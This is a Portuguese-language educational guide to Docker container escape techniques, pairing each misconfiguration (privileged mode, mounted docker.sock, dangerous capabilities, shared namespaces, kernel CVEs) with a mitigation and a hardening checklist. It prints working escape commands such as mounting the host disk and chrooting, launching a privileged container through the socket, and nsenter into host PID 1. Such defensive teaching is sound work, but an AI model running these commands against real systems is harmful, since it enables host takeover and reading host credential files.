# Docker Escape Techniques (Teoria)

> Conteudo educacional. Estas tecnicas funcionam quando o container foi configurado de forma insegura. Use apenas em labs.

---

## 1. Recon dentro do container

```bash
# Estamos em um container?
ls -la /.dockerenv 2>/dev/null && echo "Docker"
cat /proc/1/cgroup | grep -E 'docker|kubepods'

# Quem somos?
id
cat /proc/self/status | grep -E '^Cap'

# Mounts
mount | head
cat /proc/self/mountinfo
```

---

## 2. Privileged container (`--privileged`)

Da quase todas as capabilities e remove devices restriction. **Equivalente a root no host.**

```bash
# Detectar
capsh --print
# Output com CapEff completo (0x0000003fffffffff) -> --privileged
```

**Escape.** Montar disco do host:

```bash
fdisk -l           # ver discos do host
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host   # agora /mnt/host e root do host
```

**Mitigacao.** Nunca `--privileged`. Use `--cap-add=...` minimo.

---

## 3. Docker Socket Montado (`/var/run/docker.sock`)

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker  -> escape garantido
```

**Escape.** Lancar container privilegiado que monta `/` do host:

```bash
docker run -it --privileged --pid=host -v /:/host alpine chroot /host
```

**Mitigacao.** Nunca montar o socket. Se precisar de Docker-in-Docker, use TLS + RBAC. Prefira ferramentas como Podman/Buildah.

---

## 4. Capabilities perigosas

| Cap | Risco |
|-----|-------|
| `SYS_ADMIN` | Equivale a root - mount, chroot. |
| `SYS_MODULE` | Carregar kernel module no host. |
| `SYS_PTRACE` | Anexar a processos do host (se PID namespace shared). |
| `DAC_READ_SEARCH` | Ignorar permissoes de leitura via `open_by_handle_at`. |
| `NET_ADMIN` | Sniffing/spoofing na rede. |

**Exemplo `CAP_SYS_MODULE`.** Compilar e inserir modulo kernel malicioso `insmod evil.ko`.

**Exemplo `DAC_READ_SEARCH`.** Tecnica "shocker" permite ler `/etc/shadow` do host explorando handles do filesystem compartilhado.

---

## 5. PID Namespace compartilhado (`--pid=host`)

Processos do host visiveis. Pode-se atacar pids do host (sinal `SIGKILL` a um sshd).

```bash
ps -ef           # ve todo o host
nsenter -t 1 -m -u -n -p -- /bin/bash   # com SYS_PTRACE/SYS_ADMIN -> root no host
```

---

## 6. Network namespace compartilhado (`--network=host`)

Pode sniffar trafego, abrir portas do host, atacar `127.0.0.1` services (Docker API em :2375, kubelet em :10250).

---

## 7. Mount sensiveis

```bash
# Volume montado com / do host
docker run -v /:/host alpine     # MAU exemplo

# Outras montagens criticas
mount | grep -E 'proc|sys|run/secrets'
```

**Escape.** `chroot /host`.

---

## 8. Kernel exploits

Container compartilha kernel com o host. CVE no kernel = escape.

CVEs notorios:
- **DirtyCow** (CVE-2016-5195) - histórico, demonstra principio.
- **DirtyPipe** (CVE-2022-0847) - leitura/escrita arbitraria em readonly mounts.
- **OverlayFS escape** (CVE-2023-0386) - elevation via overlayfs.

**Mitigacao.** Patch kernel do host. Use distros minimal (Bottlerocket, Talos).

---

## 9. CVE-2024 Series (runC `--mount /proc/self/fd/`)

CVE-2024-21626 (Leaky Vessels): file descriptors do runC vazam para o container.

**Mitigacao.** runc >= 1.1.12.

---

## 10. Checklist de Hardening (defesa)

- [ ] Nunca `--privileged`.
- [ ] Nao monte `/var/run/docker.sock`.
- [ ] `--cap-drop=ALL` + adicionar so o necessario.
- [ ] `--read-only` no rootfs sempre que possivel.
- [ ] `--user 65532:65532` (nonroot).
- [ ] `--security-opt no-new-privileges`.
- [ ] seccomp profile (Docker default).
- [ ] AppArmor / SELinux ativo no host.
- [ ] Image scanning continuo (Trivy, Grype, Snyk).
- [ ] runC e containerd atualizados.

---

## Tools (red e blue)

- [`amicontained`](https://github.com/genuinetools/amicontained) - identifica capabilities/mounts.
- [`deepce`](https://github.com/stealthcopter/deepce) - Docker enumeration & escape.
- [`linpeas`](https://github.com/peass-ng/PEASS-ng) - enumeration generico, detecta dockersocket.
- [Trivy](https://github.com/aquasecurity/trivy) - scanner de imagens.
- [Falco](https://falco.org/) - runtime detection.

## Referencias

- [Container Threat Model - Aqua](https://www.aquasec.com/cloud-native-academy/container-security/)
- [NCC Group - Cloud Native Threat Modeling](https://www.nccgroup.com/uk/research/blog/)
